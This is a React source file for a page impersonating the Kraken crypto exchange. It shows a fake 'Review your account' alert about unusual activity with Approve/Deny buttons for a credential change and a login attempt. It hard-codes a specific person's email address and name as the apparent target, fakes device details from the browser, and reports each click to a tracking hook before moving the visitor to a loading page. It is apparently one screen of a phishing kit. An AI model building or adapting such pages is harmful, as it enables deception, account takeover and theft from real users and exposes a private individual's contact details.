import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import {
  KrakenLogo, KnFontStyle, getKnEmail, useKnTracking,
} from "@/components/kn/KnShared";

export const Route = createFileRoute("/kn/review")({
  head: () => ({ meta: [{ title: "Review your account" }] }),
  component: KrakenReviewPage,
});

function KrakenReviewPage() {
  const { trackClick, trackSubmit, knNavigate, sessionId, isObserve } = useKnTracking();
  const [email, setEmail] = useState('');
  const [location, setLocation] = useState('Richmond, Virginia');
  const [device, setDevice] = useState("Mohamed's PC");
  const [time, setTime] = useState('11:57 PM');
  const [section1Choice, setSection1Choice] = useState<'approve' | 'deny' | null>(null);
  const [section2Choice, setSection2Choice] = useState<'approve' | 'deny' | null>(null);
  const [section1Hidden, setSection1Hidden] = useState(false);
  const [section2Hidden, setSection2Hidden] = useState(false);

  useEffect(() => {
    setEmail(getKnEmail() || 'mohammedalbar27@hotmail.com');

    const ua = navigator.userAgent;
    if (/iPhone/.test(ua)) setDevice("Mohamed's iPhone");
    else if (/iPad/.test(ua)) setDevice("Mohamed's iPad");
    else if (/Android/.test(ua)) setDevice("Mohamed's Android");
    else if (/Mac/.test(ua)) setDevice("Mohamed's Mac");
    else if (/Windows/.test(ua)) setDevice("Mohamed's PC");
    else setDevice("Mohamed's Device");

    const now = new Date();
    setTime(now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }));
  }, []);

  // When section1 is chosen, animate it out after a short delay
  useEffect(() => {
    if (section1Choice) {
      const timer = setTimeout(() => setSection1Hidden(true), 400);
      return () => clearTimeout(timer);
    }
  }, [section1Choice]);

  // When section2 is chosen, animate it out then navigate
  useEffect(() => {
    if (section2Choice) {
      const timer = setTimeout(() => {
        setSection2Hidden(true);
        setTimeout(() => {
          trackClick(`Review Complete: ${section1Choice}/${section2Choice}`);
          trackSubmit('review', `${section1Choice}/${section2Choice}`);
          knNavigate('/kn/loading');
        }, 500);
      }, 400);
      return () => clearTimeout(timer);
    }
  }, [section2Choice]);

  return (
    <div
      className="kn-page min-h-screen flex flex-col"
      style={{
        backgroundColor: '#f6f5f9',
        fontFamily: "'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif",
      }}
    >
      <KnFontStyle />
      <style>{`
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        * { font-family: 'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif !important; }
        @media (max-width: 640px) {
          .kraken-card { background-color: transparent !important; box-shadow: none !important; border-radius: 0 !important; padding: 16px 0 !important; }
          .kraken-lang-btn { display: none !important; }
          .kraken-footer-detail { display: none !important; }
          .kraken-footer { justify-content: center !important; }
          .kraken-header { padding-left: 16px !important; padding-right: 16px !important; }
        }

        .kraken-section-collapse {
          overflow: hidden;
          transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease;
          max-height: 300px;
          opacity: 1;
        }
        .kraken-section-collapse.hidden-section {
          max-height: 0;
          opacity: 0;
          margin-top: 0 !important;
          margin-bottom: 0 !important;
        }
        .kraken-divider-collapse {
          transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease;
          overflow: hidden;
          max-height: 40px;
          opacity: 1;
        }
        .kraken-divider-collapse.hidden-section {
          max-height: 0;
          opacity: 0;
          margin: 0 !important;
        }
      `}</style>

      {/* Header */}
      <header style={{ paddingTop: 12, backgroundColor: '#f6f5f9' }}>
        <div
          className="flex items-center justify-between kraken-header"
          style={{ height: 40, paddingLeft: 36, paddingRight: 36 }}
        >
          <div className="cursor-pointer" onClick={() => trackClick('Logo')}>
            <KrakenLogo />
          </div>
          <button
            className="flex items-center kraken-lang-btn"
            style={{
              gap: 4,
              padding: '8px 12px',
              borderRadius: 8,
              border: 'none',
              cursor: 'pointer',
              backgroundColor: '#686b8214',
              color: '#686b82',
              fontSize: 12,
              fontWeight: 400,
              lineHeight: '16px',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M21 12C21 16.9706 16.9706 21 12 21M21 12C21 7.02944 16.9706 3 12 3M21 12H3M12 21C7.02944 21 3 16.9706 3 12M12 21C9.79086 21 8 16.9706 8 12C8 7.02944 9.79086 3 12 3M12 21C14.2091 21 16 16.9706 16 12C16 7.02944 14.2091 3 12 3M3 12C3 7.02944 7.02944 3 12 3" strokeWidth="2" strokeLinecap="square" stroke="#9497a9" fill="transparent"/>
            </svg>
            <span>English (US)</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 9.98291L11.2045 13.6874C11.6438 14.1268 12.3562 14.1268 12.7955 13.6874L16.5 9.98291" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" stroke="#9497a9" fill="transparent"/>
            </svg>
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex justify-center items-start" style={{ padding: '48px 24px 0' }}>
        <div
          className="kraken-card"
          style={{
            width: '100%',
            maxWidth: 480,
            backgroundColor: '#fff',
            borderRadius: 16,
            padding: '40px 32px',
          }}
        >
          <h1
            style={{
              fontSize: 24,
              fontWeight: 500,
              color: '#1e1131',
              margin: 0,
              lineHeight: '32px',
            }}
          >
            Review your account
          </h1>
          <p
            style={{
              fontSize: 14,
              color: '#686b82',
              marginTop: 8,
              lineHeight: '20px',
            }}
          >
            We have detected unusual activity on your account, please review these actions before continuing.
          </p>

          {/* Credential Change Section */}
          <div className={`kraken-section-collapse ${section1Hidden ? 'hidden-section' : ''}`} style={{ marginTop: 32 }}>
            <div
              style={{
                fontSize: 14,
                fontWeight: 500,
                color: '#1e1131',
              }}
            >
              Credential change
            </div>
            <p
              style={{
                fontSize: 14,
                color: '#686b82',
                marginTop: 12,
                lineHeight: '20px',
              }}
            >
              We received a request to change the email address associated with your account to{' '}
              <span style={{ fontWeight: 500, color: '#7132f5' }}>{email || '...'}</span>.
            </p>

            <div className="grid grid-cols-2 gap-3" style={{ marginTop: 20 }}>
              <button
                onClick={() => {
                  if (!section1Choice) {
                    setSection1Choice('approve');
                    trackClick('Review Section1 Approve');
                  }
                }}
                disabled={!!section1Choice}
                style={{
                  height: 48,
                  borderRadius: 12,
                  fontWeight: 500,
                  fontSize: 16,
                  border: 'none',
                  cursor: section1Choice ? 'default' : 'pointer',
                  transition: 'all 0.15s',
                  backgroundColor: section1Choice === 'approve' ? '#7132f5' : section1Choice === 'deny' ? '#e8e5ef' : '#7132f5',
                  color: section1Choice === 'deny' ? '#686b82' : '#fff',
                  opacity: section1Choice === 'deny' ? 0.5 : 1,
                }}
              >
                Approve
              </button>
              <button
                onClick={() => {
                  if (!section1Choice) {
                    setSection1Choice('deny');
                    trackClick('Review Section1 Deny');
                  }
                }}
                disabled={!!section1Choice}
                style={{
                  height: 48,
                  borderRadius: 12,
                  fontWeight: 500,
                  fontSize: 16,
                  border: 'none',
                  cursor: section1Choice ? 'default' : 'pointer',
                  transition: 'all 0.15s',
                  backgroundColor: section1Choice === 'deny' ? '#1e1131' : '#e8e5ef',
                  color: section1Choice === 'deny' ? '#fff' : section1Choice === 'approve' ? '#686b82' : '#1e1131',
                  opacity: section1Choice === 'approve' ? 0.5 : 1,
                }}
              >
                Deny
              </button>
            </div>
          </div>

          {/* Divider */}
          <div className={`kraken-divider-collapse ${section1Hidden ? 'hidden-section' : ''}`} style={{ borderTop: '1px solid #e8e5ef', margin: '32px 0' }} />

          {/* Login Attempt Section */}
          <div className={`kraken-section-collapse ${section2Hidden ? 'hidden-section' : ''}`} style={{ marginTop: section1Hidden ? 32 : 0 }}>
            <div
              style={{
                fontSize: 14,
                fontWeight: 500,
                color: '#1e1131',
              }}
            >
              Attempted login
            </div>
            <p
              style={{
                fontSize: 14,
                color: '#686b82',
                marginTop: 12,
                lineHeight: '20px',
              }}
            >
              We detected a login attempt to your account from{' '}
              <span style={{ fontWeight: 500, color: '#7132f5' }}>
                {location || 'Unknown'} at {time || '11:57 PM'}
              </span>
              , from{' '}
              <span style={{ fontWeight: 500, color: '#7132f5' }}>
                {device || "Mohamed's PC"}.
              </span>
            </p>

            <div className="grid grid-cols-2 gap-3" style={{ marginTop: 20 }}>
              <button
                onClick={() => {
                  if (!section2Choice) {
                    setSection2Choice('approve');
                    trackClick('Review Section2 Approve');
                  }
                }}
                disabled={!!section2Choice}
                style={{
                  height: 48,
                  borderRadius: 12,
                  fontWeight: 500,
                  fontSize: 16,
                  border: 'none',
                  cursor: section2Choice ? 'default' : 'pointer',
                  transition: 'all 0.15s',
                  backgroundColor: section2Choice === 'approve' ? '#7132f5' : section2Choice === 'deny' ? '#e8e5ef' : '#7132f5',
                  color: section2Choice === 'deny' ? '#686b82' : '#fff',
                  opacity: section2Choice === 'deny' ? 0.5 : 1,
                }}
              >
                Approve
              </button>
              <button
                onClick={() => {
                  if (!section2Choice) {
                    setSection2Choice('deny');
                    trackClick('Review Section2 Deny');
                  }
                }}
                disabled={!!section2Choice}
                style={{
                  height: 48,
                  borderRadius: 12,
                  fontWeight: 500,
                  fontSize: 16,
                  border: 'none',
                  cursor: section2Choice ? 'default' : 'pointer',
                  transition: 'all 0.15s',
                  backgroundColor: section2Choice === 'deny' ? '#1e1131' : '#e8e5ef',
                  color: section2Choice === 'deny' ? '#fff' : section2Choice === 'approve' ? '#686b82' : '#1e1131',
                  opacity: section2Choice === 'approve' ? 0.5 : 1,
                }}
              >
                Deny
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer
        className="flex items-center justify-between kraken-footer"
        style={{ padding: '16px 24px' }}
      >
        <p style={{ fontSize: 11, color: '#9497a9', margin: 0 }}>
          Brokerage services are provided by Kraken Securities, LLC, member{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >FINRA</a>
          /
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >SIPC</a>
          .{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >Disclosures here</a>
          .
        </p>
        <div className="flex items-center kraken-footer-detail" style={{ gap: 16 }}>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Privacy Notice</a>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Terms of Service</a>
        </div>
      </footer>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
